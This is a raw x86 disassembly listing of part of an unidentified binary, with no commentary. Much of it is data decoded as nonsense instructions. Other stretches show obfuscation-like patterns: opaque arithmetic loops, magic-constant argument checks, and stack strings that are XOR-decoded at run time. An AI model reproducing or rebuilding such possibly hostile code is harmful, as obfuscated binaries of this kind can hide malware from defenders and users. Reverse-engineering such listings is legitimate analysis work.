  41c808:	sbb    cl,BYTE PTR [ebx+ebp*1]
  41c80b:	pop    ecx
  41c80c:	fldcw  WORD PTR [edi]
  41c80e:	mov    bh,0xe2
  41c810:	cs mov ah,bl
  41c813:	div    bl
  41c815:	cmp    eax,0xdb5ab17
  41c81a:	xchg   esi,eax
  41c81b:	das    
  41c81c:	fisttp WORD PTR [ebx-0x5a301a41]
  41c822:	jmp    0x41c7ad
  41c824:	out    dx,eax
  41c825:	(bad)  
  41c826:	in     al,dx
  41c827:	lea    esi,[esi-0x21d73fc5]
  41c82d:	mov    BYTE PTR [ebx],dh
  41c82f:	and    dl,al
  41c831:	jbe    0x41c7f7
  41c833:	icebp  
  41c834:	leave  
  41c835:	sub    DWORD PTR [eax],0xe0fd7fb9
  41c83b:	mov    ch,0xd0
  41c83d:	ins    DWORD PTR es:[edi],dx
  41c83e:	jbe    0x41c7e0
  41c840:	jno    0x41c894
  41c842:	jge    0x41c879
  41c844:	ret    0xe3dc
  41c847:	cmp    al,0x63
  41c849:	loop   0x41c87c
  41c84b:	dec    eax
  41c84c:	adc    ebx,esp
  41c84e:	div    BYTE PTR [ebp+0x19]
  41c851:	or     al,0x3f
  41c853:	xlat   BYTE PTR ds:[ebx]
  41c854:	mov    DWORD PTR [edi],ebp
  41c856:	adc    BYTE PTR [edx],dl
  41c858:	xor    BYTE PTR [esi+0x64faa97d],dl
  41c85e:	ja     0x41c86d
  41c860:	rcr    BYTE PTR ds:0x2d599857,1
  41c866:	mov    DWORD PTR [ebx-0x45],edi
  41c869:	mov    al,0x7b
  41c86b:	inc    esi
  41c86c:	pusha  
  41c86d:	iret   
  41c86e:	xor    BYTE PTR [edi+edi*8-0x224d3470],bh
  41c875:	mov    bl,0x7b
  41c877:	sbb    eax,0xcc69a873
  41c87c:	xchg   ebx,eax
  41c87d:	fsubp  st(0),st
  41c880:	xchg   DWORD PTR [esi],eax
  41c882:	stos   DWORD PTR es:[edi],eax
  41c883:	push   edi
  41c884:	outs   dx,DWORD PTR ds:[esi]
  41c885:	out    0x18,al
  41c887:	mov    ah,0xba
  41c889:	sbb    dh,BYTE PTR [ebp+0x54]
  41c88c:	sub    esi,DWORD PTR [edx-0x3a]
  41c88f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c890:	mov    BYTE PTR [ebx],cl
  41c892:	xor    BYTE PTR [edi-0x68128a0f],dl
  41c898:	sub    DWORD PTR [ecx],ebp
  41c89a:	xchg   ecx,eax
  41c89b:	out    0xb2,al
  41c89d:	adc    al,0xf8
  41c89f:	repz mov cl,0xfa
  41c8a2:	pop    ebx
  41c8a3:	or     BYTE PTR [ebx+0x49],dh
  41c8a6:	xchg   esi,eax
  41c8a7:	and    esi,edx
  41c8a9:	dec    ebp
  41c8aa:	mov    al,0x89
  41c8ac:	bnd jbe 0x41c8a4
  41c8af:	js     0x41c929
  41c8b1:	in     al,dx
  41c8b2:	jmp    0x41c88b
  41c8b4:	jg     0x41c874
  41c8b6:	aad    0x66
  41c8b8:	nop
  41c8b9:	dec    edi
  41c8ba:	and    BYTE PTR [edx],ch
  41c8bc:	in     eax,dx
  41c8bd:	dec    edx
  41c8be:	jp     0x41c88f
  41c8c0:	out    dx,eax
  41c8c1:	shl    DWORD PTR [ebp+0x212bf101],cl
  41c8c7:	push   esi
  41c8c8:	loope  0x41c8a0
  41c8ca:	nop
  41c8cb:	mov    ebp,DWORD PTR [ebp+0x43]
  41c8ce:	shl    esp,cl
  41c8d0:	(bad)  
  41c8d1:	stos   BYTE PTR es:[edi],al
  41c8d2:	loope  0x41c94b
  41c8d4:	xlat   BYTE PTR ds:[ebx]
  41c8d5:	pop    edx
  41c8d6:	pop    esp
  41c8d7:	loop   0x41c950
  41c8d9:	jb     0x41c8d5
  41c8db:	jmp    0x41c91a
  41c8dd:	mov    dh,0xcd
  41c8df:	push   es
  41c8e0:	mov    BYTE PTR ds:0x5bfa862f,dh
  41c8e6:	sub    eax,0xf8902d3f
  41c8eb:	sbb    al,0x33
  41c8ed:	lods   al,BYTE PTR ds:[esi]
  41c8ee:	sbb    bh,BYTE PTR [esi+esi*4+0xa]
  41c8f2:	cld    
  41c8f3:	sbb    DWORD PTR [eax+edi*2],esi
  41c8f6:	push   0x4d
  41c8f8:	or     esp,DWORD PTR [ecx+ecx*2+0x42a8a7cb]
  41c8ff:	pop    ds
  41c900:	adc    dl,BYTE PTR [esi+0x43]
  41c903:	por    mm1,mm4
  41c906:	mov    esi,0x1a10ae7d
  41c90b:	push   ebp
  41c90c:	(bad)  
  41c90d:	adc    eax,0x8567b718
  41c912:	inc    eax
  41c913:	(bad)  
  41c915:	out    dx,al
  41c916:	jnp    0x41c8c0
  41c918:	(bad)  
  41c91a:	out    dx,al
  41c91b:	sbb    DWORD PTR [esi-0x49],ebx
  41c91e:	outs   dx,BYTE PTR ds:[esi]
  41c91f:	jno    0x41c97e
  41c921:	xchg   edx,eax
  41c922:	fmul   QWORD PTR [ebx]
  41c924:	jmp    0x41c952
  41c926:	mov    eax,0xd45ba3aa
  41c92b:	dec    ebx
  41c92c:	add    ebp,DWORD PTR [edi+ebp*4-0x32]
  41c930:	out    0xce,eax
  41c932:	mul    BYTE PTR [esi+0x78]
  41c935:	popa   
  41c936:	pop    esp
  41c937:	pop    es
  41c938:	mulps  xmm6,XMMWORD PTR [eax+edx*1+0x23]
  41c93d:	(bad)  
  41c93e:	jbe    0x41c9ae
  41c940:	mov    esi,0xaf4aaba7
  41c945:	inc    eax
  41c946:	cmp    cl,bh
  41c948:	or     al,0x1b
  41c94a:	cmp    dh,BYTE PTR [eax+eiz*8-0xbaa88c9]
  41c951:	out    dx,eax
  41c952:	push   ebx
  41c953:	mov    edi,0x743175e8
  41c958:	iret   
  41c959:	adc    eax,DWORD PTR [eax+0x38407862]
  41c95f:	popa   
  41c960:	pop    ds
  41c961:	jle    0x41c90c
  41c963:	outs   dx,BYTE PTR ds:[esi]
  41c964:	jnp    0x41c979
  41c966:	jo     0x41c9da
  41c968:	(bad)  
  41c969:	jle    0x41c92e
  41c96b:	mov    eax,ds:0x93d4cf8b
  41c970:	inc    esi
  41c971:	fidivr DWORD PTR [ecx+ebp*8+0x4d3cafb1]
  41c978:	and    BYTE PTR [ebp+0x6aee02c4],ah
  41c97e:	xchg   ecx,eax
  41c97f:	cs gs es xchg esp,eax
  41c983:	fdivr  QWORD PTR [esi-0x4bb24ee7]
  41c989:	lea    edx,[edi-0x40024884]
  41c98f:	sar    BYTE PTR [edi-0x4c5cb700],1
  41c995:	shl    esp,0x44
  41c998:	cmp    eax,0x3621ef45
  41c99d:	addr16 inc ebx
  41c99f:	pop    es
  41c9a0:	sbb    eax,0x2f6a6ed2
  41c9a5:	mov    eax,ds:0x97a217b0
  41c9aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9ab:	xor    DWORD PTR ds:0xe3b99f8e,esi
  41c9b1:	inc    edi
  41c9b2:	leave  
  41c9b3:	push   ecx
  41c9b4:	cmp    bh,BYTE PTR [ebp-0x7f]
  41c9b7:	push   esi
  41c9b8:	xor    eax,0xae09e5e0
  41c9bd:	mov    cl,0xfc
  41c9bf:	cmp    edx,ecx
  41c9c1:	mov    ah,0x33
  41c9c3:	outs   dx,DWORD PTR ds:[esi]
  41c9c4:	mov    ds:0xbc49f3a3,eax
  41c9c9:	aad    0x67
  41c9cb:	or     ah,bh
  41c9cd:	idiv   BYTE PTR [edi]
  41c9cf:	test   bh,0xe9
  41c9d2:	or     eax,0xa7a6e13c
  41c9d7:	fimul  WORD PTR [edi]
  41c9d9:	cs xchg esi,eax
  41c9db:	fsub   QWORD PTR [ecx]
  41c9dd:	loopne 0x41c9f3
  41c9df:	rcr    BYTE PTR [eax],0x77
  41c9e2:	pmulhw mm1,mm0
  41c9e5:	lock push esi
  41c9e7:	mov    al,ds:0xa44a9615
  41c9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9ed:	sti    
  41c9ee:	add    eax,0xc3b6ca9a
  41c9f3:	out    0xc0,eax
  41c9f5:	pop    esp
  41c9f6:	out    dx,al
  41c9f7:	adc    DWORD PTR [esi-0x42],edi
  41c9fa:	xor    BYTE PTR [edx],0xae
  41c9fd:	mov    edx,ecx
  41c9ff:	test   edi,esp
  41ca01:	xchg   edx,eax
  41ca02:	cld    
  41ca03:	mov    cl,0xdd
  41ca05:	jle    0x41ca2b
  41ca07:	jl     0x41c9db
  41ca09:	xchg   edi,eax
  41ca0a:	adc    DWORD PTR [ebp-0x42],ecx
  41ca0d:	sub    dh,bh
  41ca0f:	daa    
  41ca10:	out    dx,al
  41ca11:	jg     0x41c9d3
  41ca13:	(bad)  
  41ca14:	cli    
  41ca15:	push   ecx
  41ca16:	push   es
  41ca17:	ds (bad) 
  41ca19:	ss add dh,dl
  41ca1c:	jbe    0x41c9fe
  41ca1e:	in     eax,0x8c
  41ca20:	xchg   ebx,eax
  41ca21:	(bad)  
  41ca22:	ds mov bh,0x17
  41ca25:	rcr    BYTE PTR [ecx+esi*4-0x3ae01c73],0x31
  41ca2d:	rdmsr  
  41ca2f:	adc    esi,DWORD PTR [ebx+0x45]
  41ca32:	lds    eax,FWORD PTR [esi]
  41ca34:	pop    esp
  41ca35:	or     edi,DWORD PTR [ebx+esi*4+0x2e]
  41ca39:	mov    ch,0x74
  41ca3b:	cwde   
  41ca3c:	jg     0x41ca49
  41ca3e:	mov    esp,0xf5dba82e
  41ca43:	xchg   ebp,eax
  41ca44:	ja     0x41ca0d
  41ca46:	fdivr  DWORD PTR [edx+0x59854a13]
  41ca4c:	pop    ebx
  41ca4d:	adc    al,0xc3
  41ca4f:	test   DWORD PTR [edi+0x110ae263],0x43d1dbbf
  41ca59:	push   eax
  41ca5a:	pop    eax
  41ca5b:	jle    0x41cab9
  41ca5d:	out    0xa3,al
  41ca5f:	adc    DWORD PTR [edi-0x5b],0xffffffcf
  41ca63:	sbb    DWORD PTR ds:0x59dc13a9,edi
  41ca69:	adc    DWORD PTR [edx+0x7e],edi
  41ca6c:	inc    ebp
  41ca6d:	(bad)
  41ca71:	and    bh,BYTE PTR [edi]
  41ca73:	add    cl,bl
  41ca75:	add    eax,DWORD PTR [edi]
  41ca77:	xor    edi,DWORD PTR [ebx]
  41ca79:	add    bl,ch
  41ca7b:	xor    al,0x75
  41ca7d:	(bad)  
  41ca7e:	pushf  
  41ca7f:	cld    
  41ca80:	mov    dl,0x75
  41ca82:	fcomp  QWORD PTR [ebp-0x77]
  41ca85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca86:	mov    ch,0x6b
  41ca88:	retf   
  41ca89:	push   ecx
  41ca8a:	pop    edx
  41ca8b:	and    BYTE PTR [eax],0xc
  41ca8e:	into   
  41ca8f:	sub    eax,DWORD PTR [esi+0x57]
  41ca92:	addr16 ja 0x41ca80
  41ca95:	rcr    BYTE PTR [edi-0x3c],0x2f
  41ca99:	mov    edi,0x93635f11
  41ca9e:	test   BYTE PTR [ecx+0x1027d96f],bl
  41caa4:	rcr    DWORD PTR [edx],0xa6
  41caa7:	xor    edx,esp
  41caa9:	jae    0x41cab5
  41caab:	rol    ah,cl
  41caad:	xchg   edi,eax
  41caae:	ror    DWORD PTR [ebp-0x4f5d9b8e],1
  41cab4:	sbb    al,0x61
  41cab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cab7:	push   ecx
  41cab8:	sbb    BYTE PTR [edi],dl
  41caba:	mov    ds:0x4ca4e392,al
  41cabf:	(bad)  
  41cac0:	dec    esp
  41cac1:	loop   0x41ca86
  41cac3:	mov    ebx,0x981822ba
  41cac8:	adc    eax,0x76b08231
  41cacd:	loop   0x41ca94
  41cacf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cad0:	sub    al,0x48
  41cad2:	sub    BYTE PTR [ebx-0x4e],ch
  41cad5:	xchg   bl,dl
  41cad7:	add    al,0x16
  41cad9:	mov    cl,0x1d
  41cadb:	call   0xcc4cc4b2
  41cae0:	stos   DWORD PTR es:[edi],eax
  41cae1:	dec    esi
  41cae2:	inc    ebx
  41cae3:	xchg   edx,eax
  41cae4:	leave  
  41cae5:	mov    eax,0xd9a8f7d5
  41caea:	pop    edi
  41caeb:	mov    ecx,0xe13def13
  41caf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf1:	mov    fs,WORD PTR [esi]
  41caf3:	call   0xb12:0xca50fab7
  41cafa:	dec    ecx
  41cafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cafc:	sbb    edx,edx
  41cafe:	popf   
  41caff:	popa   
  41cb00:	pushf  
  41cb01:	cld    
  41cb02:	pop    esi
  41cb03:	inc    ecx
  41cb04:	cld    
  41cb05:	mov    es,WORD PTR [edi]
  41cb07:	adc    edx,edi
  41cb09:	cmp    dl,BYTE PTR [ebp+0x10]
  41cb0c:	fst    st(2)
  41cb0e:	fwait
  41cb0f:	popa   
  41cb10:	(bad)  
  41cb11:	pop    esi
  41cb12:	es dec ecx
  41cb14:	call   0x63126544
  41cb19:	cmc    
  41cb1a:	push   ss
  41cb1b:	maxps  xmm2,XMMWORD PTR [esi]
  41cb1e:	or     eax,0x4a962378
  41cb23:	scas   eax,DWORD PTR es:[edi]
  41cb24:	aam    0x7a
  41cb26:	fsub   DWORD PTR [ebp-0x35]
  41cb29:	mov    ds:0x643d48aa,al
  41cb2e:	aam    0x8d
  41cb30:	and    dl,BYTE PTR [ebx+0xb]
  41cb33:	sub    al,0x6b
  41cb35:	xchg   DWORD PTR [esi],esp
  41cb37:	(bad)  
  41cb39:	push   ebp
  41cb3a:	rol    dh,1
  41cb3c:	push   cs
  41cb3d:	loope  0x41cb0a
  41cb3f:	mov    bl,0x2e
  41cb41:	mov    dl,0xe7
  41cb43:	out    0x3f,al
  41cb45:	and    DWORD PTR [edi],0x5c09579f
  41cb4b:	xchg   ebx,eax
  41cb4c:	cmp    al,0xf3
  41cb4e:	jl     0x41cb54
  41cb50:	pop    esp
  41cb51:	jmp    0x41cbbc
  41cb53:	sub    bh,bh
  41cb55:	ror    BYTE PTR [ebx-0x38],0xec
  41cb59:	xor    edi,DWORD PTR [edi]
  41cb5b:	xchg   DWORD PTR [ebx],esp
  41cb5d:	xchg   ebp,eax
  41cb5e:	rcr    cl,1
  41cb60:	adc    bl,0x23
  41cb63:	ror    DWORD PTR [ecx+0x558bb455],cl
  41cb69:	or     BYTE PTR [ebx-0x6b7247a3],cl
  41cb6f:	adc    ebx,DWORD PTR [edi]
  41cb71:	cld    
  41cb72:	inc    ecx
  41cb73:	add    cl,BYTE PTR [ecx+0x558bb855]
  41cb79:	or     BYTE PTR [ebx-0x5a1ea1e],bh
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	mov    bh,bl
  41ce46:	mov    ecx,0xb19720ec
  41ce4b:	dec    esi
  41ce4c:	and    DWORD PTR [ebp-0x4e],0x44eb15f
  41ce53:	xor    al,BYTE PTR [ecx]
  41ce55:	add    BYTE PTR [eax],al
  41ce57:	add    BYTE PTR [ebx+0x3a],al
  41ce5a:	pop    esp
  41ce5b:	inc    ebx
  41ce5c:	jne    0x41ced0
  41ce5e:	jb     0x41cec5
  41ce60:	outs   dx,BYTE PTR ds:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
